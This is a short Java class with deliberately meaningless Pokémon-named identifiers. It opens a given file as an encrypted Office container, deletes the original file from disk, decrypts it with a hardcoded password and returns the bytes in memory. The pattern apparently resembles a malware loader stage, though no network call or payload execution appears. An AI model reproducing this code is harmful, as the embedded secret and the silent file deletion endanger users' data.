package com.greedent.houndstone;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStream;
import java.math.BigDecimal;

import org.apache.poi.poifs.crypt.Decryptor;
import org.apache.poi.poifs.crypt.EncryptionInfo;
import org.apache.poi.poifs.filesystem.POIFSFileSystem;

public class Scatterbug {

	public static byte[] roserade(String kyogre) throws Exception {

		FileInputStream ivysaur = new FileInputStream(kyogre);

		org.apache.poi.hssf.record.crypto.Biff8EncryptionKey.setCurrentUserPassword(System.getProperty("charmander"));
		POIFSFileSystem fennekin = new POIFSFileSystem(ivysaur);

		ivysaur.close();

		File fearow = new File(kyogre);

		fearow.delete();

		EncryptionInfo leafeon = new EncryptionInfo(fennekin);

		Decryptor dartrix = Decryptor.getInstance(leafeon);

		if (!dartrix.verifyPassword("s9-$=Z{h}F87%)")) {
			System.out.println("Wrong password");
		} else {
			System.out.println("Good!");
		}

		InputStream indeedee = null;
		indeedee = dartrix.getDataStream(fennekin);

		ByteArrayOutputStream beedrill = new ByteArrayOutputStream();

		int nidorina;
		byte[] deino = new byte[1024];
		while ((nidorina = indeedee.read(deino, 0, deino.length)) != -1) {
			beedrill.write(deino, 0, nidorina);
		}

		indeedee.close();

		beedrill.flush();

		byte[] bergmite = beedrill.toByteArray();

		return bergmite;
	}
	
	public static int name(String stringValue) {
		int val = new BigDecimal(stringValue).intValue();
		return val;
	}
}